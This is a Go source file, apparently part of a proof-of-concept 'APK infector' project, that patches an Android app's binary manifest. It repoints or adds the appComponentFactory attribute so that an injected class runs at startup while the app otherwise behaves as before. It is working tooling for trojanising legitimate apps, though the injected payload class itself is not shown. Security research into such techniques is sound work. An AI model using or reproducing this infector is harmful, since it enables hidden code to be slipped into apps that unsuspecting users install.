package manifest

import (
	"encoding/binary"
	"log"
	"os"
	"sort"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

const (
	// android:appComponentFactory
	// (frameworks/base/core/res/res/values/attrs_manifest.xml, API 28+)
	resIDAppComponentFactory = 0x0101057A

	appFactoryAttrName  = "appComponentFactory"
	appFactoryClassName = "aaaaaaaaaaaa.ArchinomeAppComponentFactory"
)

// axEdit is a single in-place manifest edit.
//
//	overwrite=true  -> replace the len(val) bytes at off
//	overwrite=false -> insert val at off, keeping the original bytes there
//
// Every off is an offset into the ORIGINAL manifest, so edits compose without
// recomputing positions.
type axEdit struct {
	off       int
	val       []byte
	overwrite bool
}

func u16bytes(v uint16) []byte {
	b := make([]byte, 2)
	binary.LittleEndian.PutUint16(b, v)
	return b
}

func applyEdits(data []byte, newTotal int, edits []axEdit) []byte {
	sort.SliceStable(edits, func(i, j int) bool { return edits[i].off < edits[j].off })
	out := make([]byte, 0, newTotal)
	cursor := 0
	for _, e := range edits {
		out = append(out, data[cursor:e.off]...)
		out = append(out, e.val...)
		if e.overwrite {
			cursor = e.off + len(e.val)
		} else {
			cursor = e.off
		}
	}
	return append(out, data[cursor:]...)
}

// readResMap returns the resource-id array, its chunk offset and its size.
func readResMap(data []byte) (ids []uint32, off, size int) {
	off = findChunk(data, chunkResMap)
	if off < 0 {
		log.Panic("resource map chunk not found")
	}
	size = int(leU32(data, off+4))
	hdr := int(leU16(data, off+2))
	n := (size - hdr) / 4
	ids = make([]uint32, n)
	for i := 0; i < n; i++ {
		ids[i] = leU32(data, off+8+i*4)
	}
	return
}

// PatchAppComponentFactory redirects android:appComponentFactory at the injected
// factory (aaaaaaaaaaaa.ArchinomeAppComponentFactory) using only binary manifest
// surgery - the original manifest entries, the dex files and the app behaviour
// are left untouched.
//
// Two cases:
//
//  1. The attribute is already present (every app built against androidx has it:
//     androidx.core.app.CoreComponentFactory). Only its value string is
//     repointed: the element, its attribute count and the resource map stay
//     byte-for-byte the same, the new class name is appended to the string pool.
//
//  2. The attribute is absent. A fresh attribute is appended to <application>
//     (growing that element) and the attribute name is added to the string pool
//     and the resource map. The original app's factory behaviour is preserved by
//     the injected class itself, which delegates to the framework / androidx.
func PatchAppComponentFactory() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	pool := parseStringPool(data)
	androidNs := pool.indexOf(data, androidNamespaceURI)
	if androidNs < 0 {
		log.Panic("android namespace URI not found in string pool")
	}

	resIds, resMapOff, resMapSizeOrig := readResMap(data)

	root := firstTagStart(data)
	if root < 0 {
		log.Panic("no <manifest> root tag found")
	}
	appStart := -1
	for _, c := range childElements(data, root) {
		if elementName(pool, data, c) == "application" {
			appStart = c.startOff
			break
		}
	}
	if appStart < 0 {
		log.Panic("<application> not found")
	}

	// An attribute is found through its resource id: name string index ==
	// resource-map index (the map is index-aligned with the string pool).
	afResIdx := indexOfU32(resIds, resIDAppComponentFactory)
	attr, hasAttr := findAttrByResID(data, appStart, resIds, resIDAppComponentFactory)

	// --------------------------------------------------------------- strings
	var newStrings []string
	var classStrIdx uint32
	afNameStrIdx := -1
	growResMap := false

	if hasAttr {
		old := attrStringValue(pool, data, attr)
		log.Printf("appComponentFactory present (%q) -> repointing value to %s",
			old, appFactoryClassName)
		newStrings = []string{appFactoryClassName}
		classStrIdx = uint32(pool.stringCount)
	} else if afResIdx >= 0 {
		// name string already lives in the pool: reuse its index
		log.Printf("appComponentFactory absent but name string exists -> adding attribute")
		afNameStrIdx = afResIdx
		newStrings = []string{appFactoryClassName}
		classStrIdx = uint32(pool.stringCount)
	} else {
		log.Printf("appComponentFactory absent -> adding attribute + name string + resource-map slot")
		afNameStrIdx = pool.stringCount
		growResMap = true
		newStrings = []string{appFactoryAttrName, appFactoryClassName}
		classStrIdx = uint32(pool.stringCount + 1)
	}

	// --------------------------------------------- string pool growth (append)
	oldDataSize := pool.size - pool.stringsStart
	var newOffsetBytes, newStringBytes []byte
	acc := oldDataSize
	for _, s := range newStrings {
		enc := encodeString(pool.flags, s)
		newOffsetBytes = append(newOffsetBytes, u32bytes(uint32(acc))...)
		newStringBytes = append(newStringBytes, enc...)
		acc += len(enc)
	}
	newStringCount := pool.stringCount + len(newStrings)
	newStringsStart := pool.stringsStart + len(newStrings)*4
	newPoolSize := pool.size + len(newOffsetBytes) + len(newStringBytes)
	if pad := (4 - newPoolSize%4) % 4; pad != 0 {
		newStringBytes = append(newStringBytes, make([]byte, pad)...)
		newPoolSize += pad
	}

	newTotal := len(data) + (newPoolSize - pool.size)

	edits := []axEdit{
		{pool.off + 4, u32bytes(uint32(newPoolSize)), true},
		{pool.off + 8, u32bytes(uint32(newStringCount)), true},
		{pool.off + 20, u32bytes(uint32(newStringsStart)), true},
		{pool.off + 28 + pool.stringCount*4, newOffsetBytes, false},
		{pool.off + pool.size, newStringBytes, false},
	}

	if hasAttr {
		// repoint the existing attribute value: rawValue + typed string data
		edits = append(edits,
			axEdit{attr.off + 8, u32bytes(classStrIdx), true},
			axEdit{attr.off + 16, u32bytes(classStrIdx), true},
		)
	} else {
		if growResMap {
			pad := int(afNameStrIdx) - len(resIds)
			blob := make([]byte, pad*4+4)
			copy(blob[pad*4:], u32bytes(resIDAppComponentFactory))
			newTotal += len(blob)
			edits = append(edits,
				axEdit{resMapOff + 4, u32bytes(uint32(resMapSizeOrig + len(blob))), true},
				axEdit{resMapOff + resMapSizeOrig, blob, false},
			)
		}
		// append one attribute to <application> (20 bytes) and grow the element
		attrBytes := make([]byte, 20)
		putAttr(attrBytes, 0, uint32(androidNs), uint32(afNameStrIdx), classStrIdx, 0x03, classStrIdx)
		appSize := int(leU32(data, appStart+4))
		appAttrCount := int(leU16(data, appStart+28))
		newTotal += 20
		edits = append(edits,
			axEdit{appStart + 4, u32bytes(uint32(appSize + 20)), true},
			axEdit{appStart + 28, u16bytes(uint16(appAttrCount + 1)), true},
			axEdit{appStart + appSize, attrBytes, false},
		)
	}

	// AXML total size is always the first chunk's size field (offset 0x4).
	edits = append(edits, axEdit{axmlSizeOff, u32bytes(uint32(newTotal)), true})

	out := applyEdits(data, newTotal, edits)
	utils.WriteChanges(out, utils.ManifestBinaryPath)
	log.Printf("AppComponentFactory injected: %s (manifest 0x%x -> 0x%x)",
		appFactoryClassName, len(data), len(out))
}
